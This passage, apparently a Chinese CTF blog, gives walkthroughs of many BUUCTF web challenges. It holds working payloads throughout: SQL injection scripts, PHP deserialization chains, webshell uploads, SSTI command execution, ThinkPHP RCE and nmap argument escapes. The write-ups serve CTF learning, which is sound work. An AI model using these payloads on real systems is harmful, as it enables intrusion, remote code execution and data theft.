&quot;/login&quot;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function logout() { $.get('/api/logout').done(function(data) { const {status} = data; if(status) { document.location = '/login'; } });}function getflag() { $.get('/api/flag').done(function(data) { const {flag} = data; $(&quot;#username&quot;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });} 提示配置的静态目录是程序的根目录，可能存在任意文件读取，直接访问/app.js，得到源码。 [MRCTF2020]Ez_bypass12?id[]=1&amp;gg[]=2&amp;passwd[]=1234567passwd=1234567asdf md5 一个数组会返回 false，两个 false 相等。 利用弱类型，1234567asdf 转换为数字就是 1234567 [MRCTF2020]你传你🐎呢普通的文件上传，传文件时需要修改 content type 传一个 .htaccess 1SetHandler application/x-httpd-php 传一个 .jpg 格式的🐎就可以了。 1c=show_source('/flag'); [MRCTF2020]PYWebsiteF12，直接看到 flag.php，进去改XFF，127.0.0.1. [MRCTF2020]Ezpop123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else $a=new Show; highlight_file(__FILE__);} 反序列化，POP链构造。 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Modifier { protected $var = 'php://filter/convert.base64-encode/resource=flag.php'; public function append($value){ include($value); // -1 var = flag.php } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __toString(){ return $this-&gt;str-&gt;source; // -4 str = Test } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p ; public function __get($key){ $function = $this-&gt;p; return $function(); // -2 p = Modifier }}$s1 = new Show();$s2 = new Show();$s1-&gt;source = $s2;$s2-&gt;str = new Test();$s2-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($s1));?&gt; 触发 Show 的 toString 方法，需要一个 Show 对象（s1）的 source 是另一个 Show 对象。调用顺序$s1-&gt;__wakeup，$s1-&gt;source-&gt;__toString() 触发 Test 的 get 方法，可以把 s2 的 str 属性设置为一个 Test 对象，Show 的 toString 方法访问了 source 属性，而 Test 类不存在这个属性，可以触发。调用顺序$s2-&gt;str-&gt;source，$s2-&gt;str-&gt;__get()。 触发 Modifier 的 invoke 方法，在 Test 类中可以将 p 设置为 Modifier 的对象，可以触发。同时将 Modifier 的 var 变量设置为伪协议读取 flag.php。调用顺序$s2-&gt;str-&gt;p()，$s2-&gt;str-&gt;p-&gt;__invoke()。 最后的 urlencode 是必须的 [NPUCTF2020]ReadlezPHP反序列化 123456789101112131415161718&lt;?phpclass HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = -1; $this-&gt;b = &quot;phpinfo&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$s = new HelloPhp();echo serialize($s);?&gt; phpinfo 可以接受参数，-1 表示显示所有信息，flag 在 phpinfo 中 1time.php?data=O:8:%22HelloPhp%22:2:{s:1:%22a%22;i:-1;s:1:%22b%22;s:7:%22phpinfo%22;} [极客大挑战 2019]PHP题目提示有备份，下载www.zip。 根据class.php，我们需要传入一个Name对象，username是admin，password是100，同时还要绕过wakeup方法。 123456789101112&lt;?phpclass Name{ private $username; private $password; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; }}$f = new Name('admin',100);echo serialize($f);?&gt; 得到序列化后的字符串O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}，其中username和password都是private的变量，Name前后各有一个空字符，所以长度为14。为了绕过wakeup，将O:4:&quot;Name&quot;:2后面的2改为3（当说明的变量数大于实际变量数可以绕过wakeup方法）。 由于含有空字符，使用python发送请求。 123456import requestsurl = 'http://54603761-44c7-4fe6-81de-add413bc8939.node3.buuoj.cn/'params = {'select': 'O:4:&quot;Name&quot;:3:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;}'}r = requests.get(url, params=params)print(r.text) [极客大挑战 2019]Http源代码里看到Secret.php，根据提示改一下referer,xff和useragent [极客大挑战 2019]Knife用菜刀或者蚁剑连一下，flag在根目录 [极客大挑战 2019]EasySQLadmin' or 1=1 # [极客大挑战 2019]HardSQL过滤了 ascii, substr, by, =, &gt;, union, and, *。 报错注入，用 updatexml，用like代替=，?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=123，?username=admin%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=123。 [极客大挑战 2019]Secret File查看源代码，发现一个Archive_room.php，点Secret，提示回去再看看。 抓包，发现secr3t.php 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt; file=flag.php，提示我就在这里但你看不到。file=php://filter/read=convert.base64-encode/resource=flag.php，base64解密，得到flag [强网杯] 随便注输入引号，报错 1' or 1=1#，查询出所有内容 0' union select database()#，得到waf：return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 尝试堆叠注入，用char绕过waf 123456789101112payload = &quot;0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;exp = 'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'# 查表名# exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'&quot;# 查列名# exp = &quot;select flag from `1919810931114514`&quot;# 查flag，表名要使用反引号res = ''for i in exp: res += &quot;char(%s),&quot;%(ord(i))my_payload = payload%(res[:-1])print my_payload 得到类似下面的结果 10';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a; 也可以交换1919810931114514和words两个表的名字，这样正常查询就可以得到1919810931114514表里的内容 [极客大挑战 2019]FinalSQL注入点在点击按钮出现的 search.php/id=1 中，用异或符号进行盲注。 12345678import requestsurl = &quot;http://4e80936d-618a-4d1b-8913-910f41a86c5f.node3.buuoj.cn/search.php&quot;for i in range(1,20): for j in range(1,128): d =&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'&quot;+str(i)+&quot;',1))='&quot;+str(j)+&quot;')^1&quot; r = requests.get(url+d) if 'Click' in r.text: print(chr(j)) [RoarCTF 2019]Easy JavaJava的站，点help看到filename=help.docx，可能存在文件包含。 java应用的安全目录是WEB-INF，访问其中的文件要通过 web.xml 进行相应映射才能访问。包括： WEB-INF/web.xml，Web应用配置文件，描述servlet和其他应用组件配置及命名规则。 WEB-INF/classes/，包含站点所有用的class文件，包括 servlet class 和非servlet class，不能包含在 .jar 文件中。 WEB-INF/lib/，存放web应用需要的 jar 文件，放置仅在这个应用中要求使用的 .jar 文件，例如数据库驱动 jar文件。 WEB-INF/src/，源码目录，按包结构放置各个 java 文件。 WEB-INF/database.properties，数据库配置文件。 访问WEB-INF/web.xml，用POST方法？，可以看到 1234&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;/servlet&gt; 访问这个 class 文件，WEB-INF/classes/com/wm/ctf/FlagController.class，可以看到一串 base64，解码得到flag。 [BJDCTF2020]Old HackThinkPHP 5 的RCE，直接上，?s=captcha，POST传_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag [BJDCTF2020]Easy MD5看响应头里有Hint: select * from 'admin' where password=md5($pass,true)，true是返回的十六进制MD5转化为字符串，输入ffifdyop，这个字符串转化之后是'or'6....。 然后是弱类型，传数组就可以a[]=1&amp;b[]=2。 然后是强类型，用 fastcoll，先生成两个md5值一样的文件 1./fastcoll_v1.0.0.5.exe source.txt 读取文件的时候要用二进制格式，因为含有文本格式解码不了的字符 12345678910import requestsurl = 'http://337b4ffe-e9cf-4213-a211-e49ab794d636.node3.buuoj.cn/levell14.php'with open('./1.txt', 'rb') as f1: with open('./2.txt', 'rb') as f2: t1 = f1.read() t2 = f2.read() data = {'param1': t1,'param2': t2} r = requests.post(url, data=data) print(r.text) [BJDCTF 2nd]假猪套天下第一随便输一个用户名和密码，看到提示L0g1n.php，在里面看到要99年后访问。在Cookie的 time 里改一个很大的数字，提示要从本地访问。X-Forwarded-For不行，换一个Client-ip。要从gem-love.com访问，改Referer。要从Commodo 64访问，查一下完整的 UA，是Commodore 64。要求邮箱，用From头。需要代理，用Via头。 Header 解释 示例 Accept 指定客户端能够接收的内容类型 Accept: text/plain, text/html,application/json Accept-Charset 浏览器可以接受的字符编码集。 Accept-Charset: iso-8859-5 Accept-Encoding 指定浏览器可以支持的web服务器返回内容压缩编码类型。 Accept-Encoding: compress, gzip Accept-Language 浏览器可接受的语言 Accept-Language: en,zh Accept-Ranges 可以请求网页实体的一个或者多个子范围字段 Accept-Ranges: bytes Authorization HTTP授权的授权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Cache-Control 指定请求和响应遵循的缓存机制 Cache-Control: no-cache Connection 表示是否需要持久连接。（HTTP 1.1默认进行持久连接） Connection: close Cookie HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 Cookie: $Version=1; Skin=new; Content-Length 请求的内容长度 Content-Length: 348 Content-Type 请求的与实体对应的MIME信息 Content-Type: application/x-www-form-urlencoded Date 请求发送的日期和时间 Date: Tue, 15 Nov 2010 08:12:31 GMT Expect 请求的特定的服务器行为 Expect: 100-continue From 发出请求的用户的Email From: user@email.com Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com If-Match 只有请求内容与实体相匹配才有效 If-Match: “737060cd8c284d8af7ad3082f209582d” If-Modified-Since 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-None-Match 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 If-None-Match: “737060cd8c284d8af7ad3082f209582d” If-Range 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag If-Range: “737060cd8c284d8af7ad3082f209582d” If-Unmodified-Since 只在实体在指定时间之后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT Max-Forwards 限制信息通过代理和网关传送的时间 Max-Forwards: 10 Pragma 用来包含实现特定的指令 Pragma: no-cache Proxy-Authorization 连接到代理的授权证书 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Range 只请求实体的一部分，指定范围 Range: bytes=500-999 Referer 先前网页的地址，当前请求网页紧随其后,即来路 Referer: http://www.zcmhi.com/archives… TE 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息 TE: trailers,deflate;q=0.5 Upgrade 向服务器指定某种传输协议以便服务器进行转换（如果支持） Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 User-Agent User-Agent的内容包含发出请求的用户信息 User-Agent: Mozilla/5.0 (Linux; X11) Via 通知中间网关或代理服务器地址，通信协议 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 关于消息实体的警告信息 Warn: 199 Miscellaneous warning [RoarCTF] easy calc提示加了waf，看一下calc.php 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(&quot;what are you want to do?&quot;); } } eval('echo '.$str.';'); } ?&gt; num只允许输入数字和一些符号，把查询字符串?num=改为?%20num可以绕过，而且在calc.php处理时是一样的，原理是$_GET和$_POST解析字符串的问题，可以用来bypass。 接下来只需要绕过引号 ?%20num=var_dump(scandir(chr(47))) 列出当前目录下的文件，可以看到f1agg，读一下这个文件 ?%20num=var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 得到flag [SUCTF] easy sql查询语句是select $_POST['query'] || flag from flag（不知道怎么来的） payload:1;set sql_mode=PIPES_AS_CONCAT;select 1，PIPES AS CONCAT 把 || 视为字符串连接符而不是或运算， select 1 || flag 会合并 select 1 和select flag 的查询结果，如果用字母无法得到flag，因为会合并成类似 select aflag 的形式 [SUCTF 2019]PythonginxUnicode安全，可以参考博客里的另一篇文章，Host-Split attack。 123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; payload：/getUrl?url=file%3A//suctf.c%E2%84%82/../../../../etc/passwd，前两次没有问题，第三次会把%E2%84%82转化成c，可以任意文件读取。 读nginx配置文件，在/etc/nginx/conf.d/nginx.conf没发现，/usr/local/nginx/conf/nginx.conf找到注释/usr/fffffflag。 [SUCTF] checkin插入后缀名改成jpg的一句话，提示&lt;?in contents。 改成&lt;scriptlanguage=&quot;php&quot;&gt;，提示不是图片 文件开头加上GIF89a，成功上传。 服务器是nginx，不能上传.htaccess，需要利用.user.ini 在.user.ini中可以更改php.ini中的PHP_INI_PERDIR 和 PHP_INI_USER设置。 auto_prepend_file和auto_append_file会在php文件的前/后自动插入指定的文件。 上传.user.ini： 12GIF89aauto_prepend_file=ow.jpg 上传目录下有一个index.php文件，访问index.php即可执行我们上传的php文件。 [SUCTF] easy web看一下代码，大概是要进行到eval()函数执行get_the_flag()，然后通过文件上传拿shell。 第一步，正则过滤了茫茫多的字符，需要绕过。参考无字母数字shell，无字母数字shell提高篇，php异或shell，对字符串的长度，重复使用的字符也有要求。 接下来是php特性 12345678&lt;?php$_GET['a'];$_GET[a]; # 没有引号的字符视为字符串，所以以上两条等价$_GET{a}; # 字符串后面跟随大括号和中括号都把字符串看作一个数组，所以以上两种等价$a='phpinfo';$a(); # 动态调用函数，可以直接在字符串后加上括号把字符串当作函数名echo ab^cd; # 得到两个不可见字符，php可以直接对两个字符串进行异或操作，相当于两位两位分别异或?&gt; 于是使用不可见的字符绕过正则，同时使两个字符串异或得到_GET，${}没有被过滤，直接使用可以减少一个字符量。除了异或也可以使用取反或者自增。 12345678r = 255 # %fftarget = &quot;_GET&quot;res = []for t in target: for l in range(0, 255): if l ^ r == ord(t): res.append(hex(l))print(res) 得到/xa0/xb8/xba/xab，payload: 1?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag # $_GET{%ff}() 这样就可以执行get_the_flag()了 第二步文件上传，要求后缀中不存在ph，内容中不含&lt;?，还要通过exif_imagetype。使用.htaccess绕过后缀限制，用&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[c]);&lt;/script&gt;的方式上传shell，在.htaccess和shell签名加上GIF89a来绕过exif_imagetype的检测。 构造一个上传页面，用来上传两个文件 1234&lt;Form action=&quot;http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/Form&gt; a.aaa文件： 1GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST['c']);&lt;/script&gt; 完了失败了，应该是在.htaccess前加的GIF89a导致文件失效了，换个方式。由于#在.htaccess中是注释符，不影响执行，同时这两条是图片文件头： 123#define width 123#define height 123AddType application/x-httpd-php .aaa 这时访问http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();发现返回的内容是GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST['c']);&lt;/script&gt;，可能由于版本原因script标签指定的php不能起作用。改一下a.aaa文件，把&lt;?php @eval($_REQUEST[c]);?&gt;base64编码然后加到GIF89a后面，多加两个a是为了可以正常base64解码 1GIF89aaaPD9waHAgQGV2YWwoJF9SRVFVRVNUW2NdKTs/Pg== 读取文件内容时用的是file_get_contents，可以使用php伪协议base64解密，所以修改.htaccess： 1234#define width 123#define height 123AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa 访问http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();，成功拿到shell 蚁剑连接，html目录下有个假flag，再上层的目录提示无权限，在phpinfo可以看到设置了open_basedir 12This is fake flagBut I heard php7.2-fpm has been initialized in unix socket mode! oepn_basedir绕过，选择了chdir和ini_set合用的方式绕过 1http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); 发现根目录下的THis_Is_tHe_F14g，最终payload 1http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(file_get_contents(%27/THis_Is_tHe_F14g%27)); extra：打印函数被禁用，如果curl可用，可以搭建一个靶机，把信息存入数据库或者文件，将回显信息发送到靶机，命令执行无回显时可以使用以下payload 1$_=&quot;xxx&quot;;?&gt;&lt;?=$_?&gt; 当system,passthru等不可用时，可以使用popen,proc_open等管道命令执行命令，也可以使用反引号，括起来的内容会作为shell命令执行，并将输出信息返回。 1$_=`ls`; 不能使用字母数字时也可以用通配符方式。 12/???/??? # /bin/cat/???/??? /???/???/???/?????.??? # /bin/cat /var/www/html/index.php [SWPU2019]Web1发布广告的标题位置存在注入，要在查询广告内容的时候触发。 发现 #-or会被waf，空格会被过滤，于是用/**/代替空格，在union select中闭合后面的单引号。 看看有多少列 1a' union select 1,1...1,1,'1 一度怀疑自己方法有问题，结果它TM有22列。第2、3位可以显示。由于or被过滤，没办法使用informationschema，查一下版本，MariaDB，可以使用mysql.innodb_table_stats，查到表名 123a'/**/union/**/select/**/1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22a'/**/union/**/select/**/1,(select group_concat(table_name) from mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 有FLAG_TABLE,news,users,gtid_slave_pos,ads,users几个表，接下来无列名注入。 1a'/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/a,2/**/b,3/**/c/**/union/**/select/**/*/**/from/**/users)d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 需要一个一个试出每个表有多少列。 [WUSTCTF2020]朴实无华intval 对于指数表示只会返回e前的内容。 md5 传入一个 0e215962017，md5后还是一个0e开头的数字，可以相等。 get_flag 先用 ls 看一下目录，找到flag，%09代替空格，ca\\t代替cat 1ca\\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine服务端模板注入（SSTI），有工具 tqlmap，类似于sqlmap。 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 访问/shrine/{{1+1}}，得到2，可以模板注入。源码中flag在config里，如果没有过滤可以用{{config}}直接获取，但是这里设置了黑名单并且过滤了括号。 但python有一些内置函数，比如url_for和get_flashed_messages，可用payload： 123/shrine/{{url_for.__globals__}} # 得到current_app/shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}} # 与上面类似 命令执行 1{%25 for c in [].__class__.__base__.__subclasses__() %25}%0A{%25 if c.__name__ %3D%3D 'catch_warnings' %25}%0A%20 {%25 for b in c.__init__.__globals__.values() %25}%0A%20 {%25 if b.__class__ %3D%3D {}.__class__ %25}%0A%20%20%20 {%25 if 'eval' in b.keys() %25}%0A%20%20%20%20%20 {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()') }}%0A%20%20%20 {%25 endif %25}%0A%20 {%25 endif %25}%0A%20 {%25 endfor %25}%0A{%25 endif %25}%0A{%25 endfor %25} [网鼎杯 2020 朱雀组]phpwebF12看一下有个隐藏的表单，会自动提交。警告信息显示是执行了 func 这个函数，把 p 当作参数。尝试了几个命令执行函数都被 ban 了。 读一下源码 1file_get_contents(index.php) index.php： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 把 func 转换成小写，然后检查 ，不能在 disable func 里。func(p)_返回的结果必须是字符串（其实不重要）。 里面给出了一个类，有 destruct方法，可以反序列化绕过 disable func 的限制。 1234567891011121314151617181920&lt;?phpfunction gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;}}class Test { var $p = &quot;whoami&quot;; var $func = &quot;exec&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();$s = serialize($a);unserialize($s); 验证可以执行命令，buu 的环境中 exec ls 只能看见 /var/www/html这一串目录，尝试用 system。 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} 找到 flag 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} [网鼎杯 2020 朱雀组]Nmap类似于 Online Tools，应用了 escapeshellarg()+escapeshellcmd()，导致逃逸。 两种方法 12127.0.0.1' -iL /flag -oN flag.txt ' # 利用 nmap 参数， -iL 从指定文件读取主机/IP 进行扫描，-oN 将扫描结果写入指定文件' &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml ' # 写入 shell ，由于过滤了 php ，使用 &lt;?= 和 phtml 进行绕过 [网鼎杯 2020 青龙组]ArdeUSerialz123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 反序列化，process 中需要使 op 为 2，然后在 read 中读取 flag.php。所以需要把 op 改成 2，filename 改成 flag.php。 记录一下，private 成员序列化的格式为 %00ClassName%00Attribute，protected 成员格式为%00*%00Attribute。正常 payload 1O:11:&quot;FileHandler&quot;:3:{s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:1:&quot;a&quot;;} 会使用===判断 op 是否为 &quot;2&quot;，可以利用弱类型特性，传入数字 2. 由于使用了%00，不能通过 is_valid，将序列化后的字符串中的 s改为S，后面的字符串就可以使用 16 进制表示。 执行__destruct()时，目录不再是该文件位置（？），所以需要使用绝对路径读取文件。可以通过读取 /proc/self/cmdlie获取配置文件路径，在配置文件中得到 web 绝对路径。 12345678910&lt;?phpclass FileHandler{ protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}$a = serialize(new FileHandler);$a = str_replace(chr(0),'\\00',$a);$a = str_replace('s:','S:',$a);echo urlencode($a);# PD9waHAgJGZsYWc9J2ZsYWd7ZDg2ZWRiMjMtNzk0Zi00NDI4LTllNTQtZmQ2NDk2YmNmMjBlfSc7Cg== 在 php 7.1+ 环境中，对属性类型不敏感，也可以使用 